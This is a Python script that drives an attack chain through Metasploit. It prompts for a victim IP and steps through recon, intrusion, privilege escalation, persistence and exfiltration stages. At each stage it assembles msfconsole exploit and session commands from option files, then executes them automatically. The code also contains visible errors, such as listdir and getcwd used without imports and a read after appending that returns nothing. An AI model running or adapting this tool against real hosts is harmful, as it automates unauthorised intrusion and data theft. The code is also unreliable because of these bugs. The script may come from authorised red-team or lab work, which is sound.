#! /usr/bin/env python3

import pexpect
import _thread
from queue import Queue
from queue import Empty as QueueEmpty
import socket
from time import sleep
import sys
import os
import subprocess
import struct
import fcntl

STALL_TIME = 1

def enqueue_stdout(spawn, stdout_q):
    while (True):
        try:
            temp = spawn.readline().decode()
            if (temp != ""):
                stdout_q.put(temp)
        except (pexpect.TIMEOUT):
            pass

def get_host_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    buf = None
    try:
        buf = struct.pack("256s", ifname[:15])
    except:
        buf = struct.pack("256s", ifname[:15].encode())

    ip_addr_bytes = fcntl.ioctl(
        s.fileno(),
        0x8915, #SIOCGIFADDR
        buf)[20:24]
    ip_addr_str = socket.inet_ntoa(ip_addr_bytes)
    return ip_addr_str
        
def get_option(state=""):
    print("OPTIONS:\n")
    option_list = sorted(listdir(state))
    if (len(option_list) == 0):
        print("ERROR: No options found for state " + state + ". Exiting... ")
        sleep(.1)
        return "exit"
    for option in option_list:
        print("--" + option + "--" )
        sleep(.1)
        subprocess.call(["cat", state + "/" + option])
        #cat_file(state + "/" + option)
        print()
        sleep(.1)
    for i in range(len(option_list)):
        print(str(i+1) + " - " + option_list[i])
    sleep(.1)
    opt_val = -1
    while (True):
        try:
            opt_val = int(input("\nINFO: Please enter an option: "))
            if (0 <= opt_val <= len(option_list)):
                break
            else:
                print("\tERROR: Invalid option.")
        except (ValueError):
            print("\tERROR: Invalid option.")
    rtrn_str = None
    if (opt_val == 0):
        rtrn_str = "msf"
    else:
        rtrn_str = option_list[opt_val-1]
    return rtrn_str

def get_next_state(state):
    print("NEXT STATE:\n")
    transition_list = None
    for st in states_and_transitions:
        if (st[0] == state):
            transition_list = st[1]
            break
    for i in range(len(transition_list)):
        print(str(i+1) + " - " + transition_list[i])
    ns_val = -1
    while (True):
        try:
            ns_val = int(input("\nINFO: Please enter an option: "))
            if (1 <= ns_val <= len(transition_list)):
                break
            else:
                print("\tERRROR: Invalid option.")
        except (ValueError):
            print("\tERROR: Invalid option.")
    return transition_list[ns_val-1]


def set_msf_active():
    global msf_string_active
    msf_string_active = True
    return

def increment_session_counter():
    global session_counter
    session_counter += 1
    return

def run_state(state=""):
    print("==========")
    print("STATE: " + state)
    print("==========")
    option = get_option(state)  
        
    if (option != ""):
        if (option.endswith(".sh")):
            lines = [line.rstrip('\n') for line in open(getcwd() + "/" + state + "/" + option)]
            remove = [i for i, s in enumerate(lines) if '#' in s]
            for r in remove:
                lines.pop(r)
#                print(str(r))
            for l in lines:
                if '$1' in l: 
                    l = l[:l.find('$')] + victim_ip + '\n'
                    cmd_file.write(l)
                    print(l)
                else:
                    l = l + '\n'
                    cmd_file.write(l)
                    print(l)
            
        elif (option.endswith(".msf")):
            lines = [line.strip('\n') for line in open(getcwd() + "/" + state + "/" + option)]
            remove = [i for i, s in enumerate(lines) if '#' in s]
            if not msf_string_active:
                cmd_file.write(msf_string)
                set_msf_active()
            for r in remove:
                lines.pop(r)
#                print(str(r))
            for l in lines:
                if '$VICTIM_IP' in l:
                    l = l[:l.find('$')] + victim_ip + ';'
                    cmd_file.write(l)
                elif 'sessions -i' in l and '$SESSION' in l and '$HOST_IP' in l:
                    l = l[:l.find('$SESSION')] + str(session_counter) + l[l.find('$SESSION')+8:l.find('$HOST_IP')] + host_ip + l[l.find('$HOST_IP')+8:] + 'sleep 10;'
                    print(l)
                    cmd_file.write(l)
                elif '$HOST_IP' in l:
                    l = l[:l.find('$')] + host_ip + ';'
                    print(l)
                    cmd_file.write(l)
                elif 'sessions -i' in l:
                    l = l[:l.find('$')] + str(session_counter) + l[l.find('c')-2:] + ";" + "sleep 10;"
                    print(l)
                    cmd_file.write(l)
                elif '$SESSION' in l:
                    l = l[:l.find('$')] + str(session_counter) + ';'
                    print(l)
                    cmd_file.write(l)
                elif 'exploit -j' in l:
                    l = l + ';' + 'sleep 60;'
                    print(l)
                    cmd_file.write(l)
                    increment_session_counter()
                elif 'run -j' in l:
                    l = l + ';' + 'sleep 60;'
                    print(l)
                    cmd_file.write(l)
                    increment_session_counter()
                elif not l:
                    print('empty line')
                else:
                    l = l + ';'
                    print(l)
                    cmd_file.write(l)
            
        else:
            print("ERROR: Invalid option script type. Exiting... ")
            sleep(1)
            exit(1)
    return get_next_state(state)



states_and_transitions = [
    ["recon", ["recon", "initial_intrusion", "exit"]],
    ["initial_intrusion", ["discovery", "privilege_escalation", "exit"]],
    ["discovery", ["discovery", "privilege_escalation", "data_exfiltration", "exit"]],
    ["privilege_escalation", ["discovery", "persistence", "exit"]],
    ["persistence", ["discovery", "privilege_escalation", "persistence", "exit"]],
    ["data_exfiltration", ["discovery", "privilege_escalation", "persistence", "exit"]]
    ]

print("Getting host IP address... ", end="")
sys.stdout.flush()
sleep(STALL_TIME) #stalling
host_ip = get_host_ip_address("eth0")
print("Done.")
sys.stdout.flush()
sleep(STALL_TIME) #stalling
print("\tHost IP Address: " + str(host_ip))
sys.stdout.flush()
sleep(STALL_TIME) #stalling

victim_ip = ""
while (True):
    victim_ip = input("\nINFO: Please enter victim IP address: ")
    sleep(1) #stalling
    try:
        socket.inet_aton(victim_ip)
        break
    except:
        print("\tERROR: Invalid IP address.")

print("\tVictim IP Address: " + str(victim_ip))
sys.stdout.flush()
sleep(STALL_TIME) #stalling

#host_ip = '10.0.2.8'
#victim_ip = '10.0.2.10'

cmd_file = open('cmd_temp', mode='a+')

msf_string = '/usr/bin/msfconsole -q -x "'
msf_string_active = False
session_counter = 0
next_state = run_state("recon")


while (True):
    if (next_state == "exit"):
        if msf_string_active:
            cmd_file.write('exit -y"\n')
        print("Final Shell Script: \n\n----------------")
        p = cmd_file.read()
        print(p)
        sys.stdout.flush()
        sleep(1)
        break
    next_state = run_state(next_state)

cmd_file.close()
os.chmod('cmd_temp', 0o744)
print("Executing Assembled Shell Script")
os.system('./cmd_temp')
exit()

